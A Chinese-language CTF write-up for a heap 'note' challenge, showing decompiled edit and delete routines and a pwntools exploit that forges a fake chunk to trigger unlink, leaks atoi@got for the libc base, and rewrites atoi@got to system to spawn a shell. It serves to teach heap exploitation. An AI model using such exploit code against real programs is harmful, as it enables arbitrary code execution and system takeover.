
### 功能四就是删除 note 回收内存

```c
unsigned __int64 sub_400D43()
{
    _BYTE *v0; // rbx
    int v2; // [rsp+8h] [rbp-E8h]
    int v3; // [rsp+Ch] [rbp-E4h]
    char *src; // [rsp+10h] [rbp-E0h]
    __int64 v5; // [rsp+18h] [rbp-D8h]
    char dest[128]; // [rsp+20h] [rbp-D0h] BYREF
    void *v7; // [rsp+A0h] [rbp-50h]
    unsigned __int64 v8; // [rsp+D8h] [rbp-18h]
    v8 = __readfsqword(0x28u);
    if ( dword_602160 )
    {
        puts("Input the id of the note:");
        v2 = sub_400A4A();
        if ( (unsigned int)v2 <= 3 )
        {
            src = (char *) *(&ptr + v2);
            v5 = qword_602140[v2];
            if ( src )
            {
                puts("do you want to overwrite or append?[1.overwrite/2.append]");
                v3 = sub_400A4A();
                if ( v3 == 1 || v3 == 2 )
                {
                    if ( v3 == 1 )
                        dest[0] = 0;
                    else
                        strcpy(dest, src);
                    v7 = malloc(0xA0uLL);
                    strcpy((char *)v7, "TheNewContents:");
                    printf((const char *)v7);
                    sub_4009BD((__int64)v7 + 15, 144LL, 10);
                    sub_400B10((const char *)v7 + 15);
                    v0 = v7;
                    v0[v5 - strlen(dest) + 14] = 0;
                    strncat(dest, (const char *)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);
                    strcpy(src, dest);
                    free(v7);
                    puts("Edit note success!");
                }
                else
                {
                    puts("Error choice!");
                }
            }
            else
            {
                puts("note has been deleted");
            }
        }
    }
    else
    {
        puts("Please add a note!");
    }
    return __readfsqword(0x28u) ^ v8;
}
```

```c
int sub_400C67()
{
    __int64 v0; // rax
    int v2; // [rsp+Ch] [rbp-4h]
    puts("Input the id of the note:");
    LODWORD(v0) = sub_400A4A();
    v2 = v0;
    if ( (unsigned int)v0 <= 3 )
    {
        v0 = (__int64) *(&ptr + (int)v0);
        if ( v0 )
        {
            free(*(&ptr + v2));
            *(&ptr + v2) = 0LL;
            qword_602140[v2] = 0LL;
            LODWORD(v0) = puts("delete note success!");
        }
    }
    return v0;
}
```

## 思路

- 利用 `unlink` 修改 `ptr[1]` 为 `&ptr[1] - 0x18`。
- 利用 `new` `note` 的堆溢出修改 `ptr[0]` 为 `atoi@got` 地址。
- 利用 `show` `note` 能把 `atoi@got` 内容打印出来，这样就可以泄漏 `libc` 基址。
- 利用 `edit` 功能修改 `ptr[0]` 也就是 `atoi@got` 为 `system` 函数地址，接着输入 `/bin/sh`，`atoi("/bin/sh")` 就变成了 `system("/bin/sh")`。

## 分析过程

```python
def new(size,payload):
    io.recvuntil(b"option-->\n")
    io.sendline(b'1')
    io.recvuntil(b"Input the length of the note content:(less than 128)\n")
    io.sendline(str(size).encode())
    io.recvuntil(b"Input the note content:\n")
    io.sendline(payload)
def show(index):
    io.recvuntil(b"option-->\n")
    io.sendline(b'2')
    io.recvuntil(b"Input the id of the note:\n")
    io.sendline(str(index).encode())
    io.recvuntil(b"Content is ")
    content = u64(io.recvuntil(b"\n",drop=True).ljust(0x8,b'\x00'))
    return content
def edit(index,payload):
    io.recvuntil(b"option-->\n")
    io.sendline(b'3')
    io.recvuntil(b"Input the id of the note:\n")
    io.sendline(str(index).encode())
    io.recvuntil(b"do you want to overwrite or append?[1.overwrite/2.append]\n")
    io.sendline(b'1')
    io.recvuntil(b":")
    io.sendline(payload)
def delete(index):
    io.recvuntil(b"option-->\n")
    io.sendline(b'4')
    io.recvuntil(b"Input the id of the note:\n")
    io.sendline(str(index).encode())
```

先写下菜单的交互

```python
ptr = 0x0000000000602120
io.recvuntil(b"\n")
io.sendline(b'aa')
io.recvuntil(b"\n")
io.sendline(b'aa')
new(0,b'aa') #chunk0
new(0x30,b'aa') #chunk1
new(0x80,b'aa') #chunk2
```

利用 `new` 功能申请三个内存，注意 `malloc(0)` 会分配最小 `chunk` 也就是 `0x20`，分别分配了 `0x20`，`0x40`，`0x90` 大小的 `chunk`，记为 `chunk0`，`chunk1`，`chunk2`

![](https://bbs.kanxue.com/upload/attach/202603/1002337_42TBG59TXDFYT53.png)

```python
delete(0)
```

删除 `note0`，此时 `chunk0` 会放入 `fastbin`

![](https://bbs.kanxue.com/upload/attach/202603/1002337_VX9JVH7T8AEV72Y.png)

```python
payload = b'a'*0x10
payload += p64(0)+p64(0x41) #chunk1的presize和size
payload += p64(0) # fake chunk的presize
payload += p64(0x20) # fake chunk的size
payload += p64(ptr + 0x8 - 0x18) # fake chunk的fd，即&ptr[1]-0x18
payload += p64(ptr + 0x8 - 0x10) # fake chunk的bk，即&ptr[1]-0x10
payload += p64(0x20) # 这里是为了绕过chunksize(P) != prev_size (next_chunk(P))这个检查
payload += b'a'*0x8
payload += p64(0x30) # chunk2的presize
payload += p64(0x90) # chunk2的size，这里主要把inuse标志位改成0，这样free时就能触发unlink
new(0,payload) #这里是prt[3]，但是分配的chunk还是chunk0，这里利用堆溢出修改chunk1和chunk2
```

接着我们重新申请一个内存，分配的 `chunk` 其实还是 `chunk0`，这里利用堆溢出能够覆盖 `chunk2` 和 `chunk3` 的内容

![](https://bbs.kanxue.com/upload/attach/202603/1002337_XDASNPX9BWG4JKK.png)
![](https://bbs.kanxue.com/upload/attach/202603/1002337_CMNTSWC2JBJ3GBG.png)

```python
delete(2) #触发unlink
```

此时我们回收 `note2`，就可以触发 `unlink`，使得 `ptr[1] = &ptr[1] - 0x18`，具体 `unlink` 的分析过程可以看第一个例题，其实都差不多，这里就不赘述了。

![](https://bbs.kanxue.com/upload/attach/202603/1002337_S53RYAJ72HS7FQM.png)

```python
payload = b'a'*0x18 + p64(elf.got["atoi"])
edit(1,payload) #通过unlink可以把ptr[1]改写成&ptr[1]-0x18，因此这里就是修改prt数组的内容，把prt[0]改成atoi@got
```

此时我们利用程序的 `edit` 功能，修改 `ptr[1]` 的内容为 `atoi@got`

![](https://bbs.kanxue.com/upload/attach/202603/1002337_8J4DBCFASB7NDBV.png)

```python
atoi_addr = show(1) # 泄露atoi@got内容就知道libc基址了
log.info(hex(atoi_addr))
```

接着我们就可以用 `show` 功能打印 `prt[1]` 也就是 `atoi@got` 的内容

![](https://bbs.kanxue.com/upload/attach/202603/1002337_FHHPAD4QEFKD5TA.png)

```python
base = atoi_addr - libc.symbols["atoi"]
system = base + libc.symbols["system"]
payload = p64(system)
edit(1,payload) # 将atoi@got内容改写成system函数地址
io.recvuntil(b'\n')
io.sendline(b'/bin/sh\x00')
io.interactive()
```

接下来就是计算 `libc` 偏移，将 `atoi@got` 改成 `system` 地址了，最后 `atoi("/bin/sh")` 变成了 `system("/bin/sh")`

## EXP
